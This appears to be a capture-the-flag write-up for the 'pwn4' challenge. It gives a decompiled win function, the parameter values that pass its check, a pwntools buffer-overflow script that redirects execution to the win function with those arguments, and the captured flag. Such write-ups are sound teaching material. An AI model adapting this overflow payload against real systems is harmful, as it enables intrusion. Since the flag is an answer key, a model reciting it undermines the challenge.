# pwn / pwn4

> Points: 2409

## Question

```
nc uwctf.ml 6005
```

## Solution

For this challenge our win function looks like this.
```c
void win(int param_1,int param_2) {
    if ((param_2 + param_1 == -0x21524111) && (param_2 * param_1 == -0x1123502)) {
        system("/bin/cat ./flag.txt");
    }
    return;
}
```

Now instead of getting the values directly we get two equations we have to solve.  
I'm not gonna explain how to solve it, just know that `param_1` has to be `893835166` and `param_2` has to be `2842093393`.  
See the writeup on pwn2 for an explanation on how the parameters are sent.
```python
from pwn import *

exe = ELF("chall4.bin")
p = remote("uwctf.ml", 6005)
p.send(b"A" * 28 + p32(exe.sym["win"]) + b"AAAA" + p32(893835166) + p32(2842093393) + b"\n")
p.clean_and_log(timeout=1)
```

### Flag

`uwctf{buff3r0v3rf10w4_2cf6bc249a4fa07e}`
